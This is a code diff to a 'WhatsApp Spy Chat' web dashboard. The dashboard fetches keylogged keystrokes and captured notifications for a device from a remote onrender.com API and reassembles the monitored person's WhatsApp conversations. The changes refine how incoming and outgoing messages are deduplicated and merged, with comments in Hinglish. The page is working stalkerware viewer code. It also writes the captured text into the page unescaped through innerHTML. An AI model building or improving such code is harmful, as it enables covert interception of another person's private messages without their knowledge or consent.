@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Spy Chat (Fixed Logic)</title>
+    <title>WhatsApp Spy Chat (Incoming Fixed)</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
@@ -55,7 +55,7 @@
 
     <div class="sidebar" id="sidebar">
         <div class="sidebar-header">
-            <span>Chats <span style="font-size:10px; color:#00a884;">(Fixed)</span></span>
+            <span>Chats <span style="font-size:10px; color:#00a884;">(Incoming Fixed)</span></span>
             <i class="fas fa-trash-alt" onclick="resetData()" style="cursor:pointer; font-size:14px; color:#f15c6d;" title="Clear & Reset"></i>
         </div>
         <div class="contact-list" id="contactList">
@@ -78,7 +78,7 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
-        const STORAGE_KEY = `whatsapp_spy_fixed_v5_${deviceId}`; // New key for fresh start
+        const STORAGE_KEY = `whatsapp_spy_final_v6_${deviceId}`; // Changed key for fresh start
 
         const API_KEYLOGS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/keylogs`;
         const API_NOTIFS = `https://child-v9no.onrender.com/api/get-data/${deviceId}/notifications`;
@@ -98,12 +98,10 @@
             }
         }
 
-        // 2. Remove Bad Data (FIXED: Checks Type too)
+        // 2. Remove Bad Data
         function sanitizeData() {
             Object.keys(allChats).forEach(user => {
                 allChats[user] = allChats[user].filter(m => m.time && !isNaN(new Date(m.time).getTime()));
-                
-                // Remove generic junk
                 allChats[user] = allChats[user].filter(m => !m.text.toLowerCase().includes("new messages"));
 
                 const uniqueMsgs = [];
@@ -112,7 +110,6 @@
                         uniqueMsgs.push(m);
                     } else {
                         const last = uniqueMsgs[uniqueMsgs.length - 1];
-                        // FIXED: Agar text same hai PAR type alag hai (incoming vs outgoing), to delete MAT karo
                         if (m.text === last.text && Math.abs(m.time - last.time) < 2000 && m.type === last.type) return; 
                         uniqueMsgs.push(m);
                     }
@@ -140,11 +137,10 @@
                     }
                 });
 
-                // Process Notifications (Always Incoming/Screen)
+                // Process Notifications (Incoming)
                 notifs.sort((a,b) => a.postTime - b.postTime);
                 notifs.forEach(item => {
                     if(item.packageName && item.packageName.includes('whatsapp')) {
-                        // Android app filters Left/Right, so we trust this is Incoming
                         if(processMessage(item.title, item.text, item.postTime, 'incoming')) hasNewData = true;
                     }
                 });
@@ -159,13 +155,12 @@
 
         function isValidLog(item) {
             if(!item.text) return false;
-            // Keylogs are outgoing
             if(item.type === 'outgoing_keylog') return true;
             if(item.appName === 'WhatsApp' && !item.packageName) return true;
             return false;
         }
 
-        // 4. MAIN LOGIC (FIXED)
+        // --- 4. MAIN LOGIC (INCOMING FIXED HERE) ---
         function processMessage(user, text, time, type) {
             if (!user || !text || text.trim() === "") return false;
             
@@ -173,35 +168,42 @@
             if (!ts || isNaN(new Date(ts).getTime())) return false; 
 
             if (user.includes("WhatsApp")) return false; 
-
-            // BLOCK SUMMARY MESSAGES
             if (text.toLowerCase().includes("new messages")) return false;
             if (text.toLowerCase().includes("incoming voice call")) return false;
 
             if (!allChats[user]) allChats[user] = [];
             const history = allChats[user];
-
             const lastMsg = history[history.length - 1];
 
-            // --- STRICT "SINGLE MESSAGE" LOGIC ---
-            
-            // 1. Exact Duplicate Check (FIXED: Checks Type also)
-            // Agar msg same hai aur time paas hai, lekin TYPE alag hai -> to wo VALID hai.
+            // 1. Check Exact Duplicate
             const alreadyExists = history.some(m => m.text === text && Math.abs(m.time - ts) < 5000 && m.type === type);
             if (alreadyExists) return false;
 
-            // 2. INCOMING GROUP/STACK BLOCKER
+            // --- 🛑 FIX START: INCOMING STACKING ---
+            // Sirf incoming messages par ye rule lagega
             if (type === 'incoming' && lastMsg && lastMsg.type === 'incoming') {
-                // Sirf Incoming ke baad Incoming check karo
-                if (text.includes(lastMsg.text) && text.length > lastMsg.text.length) {
-                    return false; // Stop the group message stack
+                
+                // Case 1: Agar naya msg purane msg se start hota hai (e.g. "Hello" -> "Hello Kaise ho")
+                // To purana hissa kaat do aur sirf naya hissa save karo.
+                if (text.startsWith(lastMsg.text)) {
+                    let cleanText = text.substring(lastMsg.text.length).trim();
+                    if (cleanText === "") return false; // Agar katne ke baad kuch bacha hi nahi, to duplicate hai
+                    text = cleanText; // Update text
                 }
-                if (text.includes("...") && text.includes(lastMsg.text.substring(0, 5))) {
+                
+                // Case 2: Agar naya msg pura ka pura purane msg me contained hai (Ualta case)
+                else if (lastMsg.text.includes(text)) {
+                    return false; // Ignore karo
+                }
+
+                // Case 3: Agar message me last msg ka text end me chipka hai (Junk)
+                else if (text.includes(lastMsg.text)) {
                     return false;
                 }
             }
+            // --- 🛑 FIX END ---
 
-            // 3. OUTGOING TYPING CORRECTION (Only merge if both are outgoing)
+            // Outgoing Logic (Untouched - Same as before)
             if (type === 'outgoing' && lastMsg && lastMsg.type === 'outgoing') {
                 const timeDiff = Math.abs(ts - lastMsg.time);
                 if (text.startsWith(lastMsg.text) && timeDiff < 10000) {
@@ -290,7 +292,6 @@
 
                 const tStr = d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit', hour12:false});
                 const div = document.createElement('div');
-                // Ensure class is strictly applied from data
                 div.className = `msg ${m.type}`; 
                 div.innerHTML = `
                     ${m.text}
